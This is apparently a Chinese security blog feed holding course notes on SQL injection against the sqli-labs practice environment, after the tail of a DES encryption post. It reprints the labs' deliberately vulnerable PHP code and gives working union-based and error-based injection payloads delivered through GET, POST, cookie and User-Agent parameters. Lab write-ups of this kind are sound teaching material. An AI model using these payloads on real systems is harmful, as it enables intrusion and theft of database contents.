alt="image.png"></p><ol><li>S-盒代替之后，每盒有4位，共八盒，就是32位，作为P-盒的输入块</li><li>根据上表，对Rn进行置换，得到的串与左部分Ln进行异或运算，得到的串赋值给R(n+1)</li><li>R(n)直接赋值给L(n+1)</li><li>然后再进行下一次迭代</li></ol><h2 id="逆置换"><a href="#逆置换" class="headerlink" title="逆置换"></a>逆置换</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913224505.png" alt="image.png"></p><ul><li>以上的迭代算法成为函数f</li><li>进行完16次迭代，得到L16和R16，然后将LR调换，最后合并为64位的输出块，进行逆置换</li><li>逆置换根据上表，对应的位进行置换，逆置换是初始置换的逆运算，就是说初始置换输出的第1位是原始输入的第58位，第2位是第50位，而逆置换输出的第58位是输入的第1位，输出的第50位是输入的第2位</li><li>最后得到的64位输出块，则是DES加密的最终密文</li></ul>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 加密算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day14 WEB漏洞-SQL注入之类型及提交注入</title>
      <link href="/2023/09/09/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day14%20WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/09/09/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day14%20WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909150934.png" alt="image.png"></p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul><li>在真实SQL注入安全测试中，我们一定要先明确提交数据及提交方法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取,后续安全测试中我们也必须满足同等的操作才能进行注入。</li></ul><h2 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a>简要明确参数类型</h2><ul><li>数字、字符、搜索、JSON等</li><li>直接输入的则为数字，如果是字符，则需要加上单引号</li><li>如果网站有搜索功能，那么搜索语句通常使用到%百分号</li></ul><h2 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a>简要明确请求方法</h2><ul><li>GET,POST,COOKIE,REQUEST,HTTP头等</li><li>其中sql语句干扰符号：’，”，s，)，}等，具体需看写法</li></ul><h1 id="参数字符型注入测试"><a href="#参数字符型注入测试" class="headerlink" title="参数字符型注入测试"></a>参数字符型注入测试</h1><ul><li>sqli-labs less-5源代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;Less-<span class="number">5</span> Double Query- Single Quotes- String&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">&quot;#000000&quot;</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot; margin-top:60px;color:#FFF; font-size:23px; text-align:center&quot;</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">&quot;#FF0000&quot;</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">&quot;3&quot;</span> color=<span class="string">&quot;#FFFF00&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="comment">#SQL执行的语句</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../images/Less-5.jpg&quot;</span> /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;</code>SQL执行的语句是采用了’ ‘闭合</li><li>我们要是直接使用<code>?id=1 and 1=1</code>相当于执行的是<code>SELECT * FROM users WHERE id=&#39;1 and 1=1&#39; LIMIT 0,1;</code>，是不会有任何反应的<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909160210.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909160810.png" alt="image.png"></li><li>正确的报错语句<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>2</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161612.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161622.png" alt="image.png"></li><li>相当于在数据库执行<code> select * from users where id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161717.png" alt="image.png"></li><li>获取字段<code>?id=1&#39; order by 4 --+</code></li><li><code>--+</code>将后面的代码注释不执行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161845.png" alt="image.png"></li><li>在数据库中执行<code> select * from users where id=&#39;1&#39; order by 4;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909162119.png" alt="image.png"></li><li>less-6源代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure></li><li>可以看出采用了双引号的方式进行了编码，绕过方法”闭合前面的引号，后面采用–+注释</li><li><code>?id=1&quot; order by 4 --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909162832.png" alt="image.png"></li></ul><h1 id="POST数据提交注入测试"><a href="#POST数据提交注入测试" class="headerlink" title="POST数据提交注入测试"></a>POST数据提交注入测试</h1><ul><li>sqli-labs less-11</li><li>输入错误的用户名密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909164153.png" alt="image.png"></li><li>输入正确的用户名密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909164139.png" alt="image.png"></li><li>源代码，其中加入<code>echo $sql;</code>回显sql执行命令<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909164502.png" alt="image.png"></li></ul><h2 id="使用hackbar模拟post数据提交测试"><a href="#使用hackbar模拟post数据提交测试" class="headerlink" title="使用hackbar模拟post数据提交测试"></a>使用hackbar模拟post数据提交测试</h2><ul><li>hackbar安装地址：<a href="https://github.com/HCTYMFF/hackbar2.1.3">https://github.com/HCTYMFF/hackbar2.1.3</a></li></ul><h3 id="使用hackbar进行登录测试"><a href="#使用hackbar进行登录测试" class="headerlink" title="使用hackbar进行登录测试"></a>使用hackbar进行登录测试</h3><ul><li>一般的登录情况都是采用的post提交数据、通过抓包获取到登录信息将它放在hackbar中进行登录测试，也是为了验证hackbar是否能正常使用，要是确认hackbar能正常使用这个可以跳过。</li><li>进行登录，然后使用burp抓包获取登录信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910150620.png" alt="image.png"></li><li>获取到的登录信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=Dumb&amp;passwd=Dumb&amp;submit=Submit</span><br></pre></td></tr></table></figure></li><li>在hackbar当中进行测试，输入post data<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910150805.png" alt="image.png"></li><li>登录成功</li></ul><h3 id="枚举数据库字段"><a href="#枚举数据库字段" class="headerlink" title="枚举数据库字段"></a>枚举数据库字段</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151021.png" alt="image.png"></p><ul><li>post data以下内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=admin<span class="string">&#x27; order by 3#&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure></li><li>在mysql当中一般注释后面的字句是采用<code>--+</code>，在有些字句中采用<code>#</code>注释。</li><li>需要多测试才能发现，为了验证<code>#</code>是注释符号，将<code>#</code>替换为<code>--+</code>执行，查看结果看到报错信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151418.png" alt="image.png"></li><li>在数据库当中执行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151642.png" alt="image.png"></li><li>可以得出结论，最终验证<code>#</code>是注释了后面的字句</li><li>将order by 3改成2查看</li><li><code>uname=admin&#39; order by 2#&amp;passwd=admin&amp;submit=Submit</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910151753.png" alt="image.png"></li><li>可以看到登录成功，但实际上登录的用户名密码是错误的，因为只将sql语句注入进去没有报错，下面的语句正常的执行就显示登录成功</li><li>换句话说就是登录到情况只有两个字段，很可能就是用户名密码。</li></ul><h3 id="枚举出数据库的名称"><a href="#枚举出数据库的名称" class="headerlink" title="枚举出数据库的名称"></a>枚举出数据库的名称</h3><ul><li><code>uname=admin&#39; and 1=2 union select database(),2 #&amp;passwd=admin&amp;submit=Submit</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910152437.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910152528.png" alt="image.png"></li></ul><h1 id="参数JSON数据注入测试"><a href="#参数JSON数据注入测试" class="headerlink" title="参数JSON数据注入测试"></a>参数JSON数据注入测试</h1><ul><li>本地环境代码演示</li><li>json格式<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910154035.png" alt="image.png"></li><li>json注入<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910154057.png" alt="image.png"></li><li>注入方式：如果是数字的，可以不加<code>&#39;</code>闭合，如果是字符的话，加上<code>&quot;</code>闭合</li></ul><h1 id="COOKIE数据提交注入测试"><a href="#COOKIE数据提交注入测试" class="headerlink" title="COOKIE数据提交注入测试"></a>COOKIE数据提交注入测试</h1><ul><li>sqli-labs less-20</li></ul><h2 id="网站传递参数的方式"><a href="#网站传递参数的方式" class="headerlink" title="网站传递参数的方式"></a>网站传递参数的方式</h2><table><thead><tr><th>参数类型</th><th>含义</th></tr></thead><tbody><tr><td>get型</td><td>一般访问网站的行为</td></tr><tr><td>cookie型</td><td>伴随着访问网页的行为</td></tr><tr><td>post型</td><td>上传文件，登录</td></tr></tbody></table><ul><li><strong>cookie注入原理</strong>：对get传递来的参数进行了过滤，但是忽略了cookie也可以传递参数。</li><li>cookie注入的原理在于更改本地的cookie，从而利用cookie来提交非法语句。</li><li>条件一：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤</li><li>条件二： 条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。</li><li>通过burp抓包分析<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910160215.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910160224.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910160232.png" alt="image.png"></li><li>这里在数据包当中发现了一个带cookie的参数<code>Cookie: uname=Dumb</code></li><li>将这个数据包发送到repeater（重发器）当中</li><li>并修改cookie参数<code>Cookie: uname=Dumb&#39; and 1=2 union select database(),2,3 #</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910161119.png" alt="image.png"></li><li>写改为<code>Cookie: uname=Dumb&#39; and 1=2 union select user(),2,3 #</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910161256.png" alt="image.png"></li></ul><h1 id="HTTP头部参数数据注入测试"><a href="#HTTP头部参数数据注入测试" class="headerlink" title="HTTP头部参数数据注入测试"></a>HTTP头部参数数据注入测试</h1><ul><li>sqli-labs less-18</li><li>查看数据库源代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row1</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>);</span><br><span class="line"><span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .<span class="variable">$uagent</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>根据源代码可以看出，对执行的insert语句没有任何的限制，也就是说我们通过修改http的头部信息可以达到sql注入的效果</li><li>为方便实验，在103行加入sql语句的显示界面<code>echo $insert;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910162059.png" alt="image.png"></li><li>修改数据包注入，获取数据库名称</li><li><code>User-Agent: &#39;and extractvalue (1,concat(0x7e,(select database()),0x7e)) and&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910162314.png" alt="image.png"></li><li>获取用户名<code>User-Agent: &#39;and extractvalue (1,concat(0x7e,(select user()),0x7e)) and&#39; Firefox/116.0</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230910162449.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day13 WEB漏洞SQL注入之MYSQL注入</title>
      <link href="/2023/09/08/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day13%20WEB%E6%BC%8F%E6%B4%9ESQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/09/08/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day13%20WEB%E6%BC%8F%E6%B4%9ESQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907131330.png" alt="image.png"></p><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><ul><li>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</li><li>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</li></ul><h2 id="SCHEMATA表"><a href="#SCHEMATA表" class="headerlink" title="SCHEMATA表"></a>SCHEMATA表</h2><ul><li>当前MySQL实例中所有数据库的信息</li><li><code>SHOW DATABASES;</code>命令用来从这个表获取数据<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907200630.png" alt="image.png"></li></ul><h2 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h2><ul><li><code>select SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907200841.png" alt="image.png"></li></ul><h2 id="TABLES表"><a href="#TABLES表" class="headerlink" title="TABLES表"></a>TABLES表</h2><ul><li>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。</li><li><code>SHOW TABLES FROM XX;</code> 命令从这个表获取结果。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907201507.png"></li></ul><h2 id="COLUMNS表"><a href="#COLUMNS表" class="headerlink" title="COLUMNS表"></a>COLUMNS表</h2><ul><li>存储表中的列信息，包括表有多少列、每个列的类型等。<code>SHOW COLUMNS FROM schemaname.tablename</code> 命令从这个表获取结果。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907220526.png" alt="image.png"></li></ul><h2 id="USER-PRIVILEGES表"><a href="#USER-PRIVILEGES表" class="headerlink" title="USER_PRIVILEGES表"></a>USER_PRIVILEGES表</h2><ul><li>用户权限表。内容源自 mysql.user 授权表。是非标准表。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230907220730.png" alt="image.png"></li></ul><h1 id="跨库攻击"><a href="#跨库攻击" class="headerlink" title="跨库攻击"></a>跨库攻击</h1><ul><li>前提准备<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database book;</span><br><span class="line">mysql&gt; use book;</span><br><span class="line">mysql&gt; CREATE TABLE IF NOT EXISTS book(    `book_id` INT UNSIGNED AUTO_INCREMENT,    `book_title` VARCHAR(100) NOT NULL,    `book_author` VARCHAR(40) NOT NULL,    `submission_date` DATE,    PRIMARY KEY ( `book_id` ) )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| book               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">mysql&gt; use book;</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+----------------+</span><br><span class="line">| Tables_in_book |</span><br><span class="line">+----------------+</span><br><span class="line">| book           |</span><br><span class="line">+----------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; desc book;</span><br><span class="line">+-----------------+------------------+------+-----+---------+----------------+</span><br><span class="line">| Field           | Type             | Null | Key | Default | Extra          |</span><br><span class="line">+-----------------+------------------+------+-----+---------+----------------+</span><br><span class="line">| book_id         | int(10) unsigned | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| book_title      | varchar(100)     | NO   |     | NULL    |                |</span><br><span class="line">| book_author     | varchar(40)      | NO   |     | NULL    |                |</span><br><span class="line">| submission_date | <span class="built_in">date</span>             | YES  |     | NULL    |                |</span><br><span class="line">+-----------------+------------------+------+-----+---------+----------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 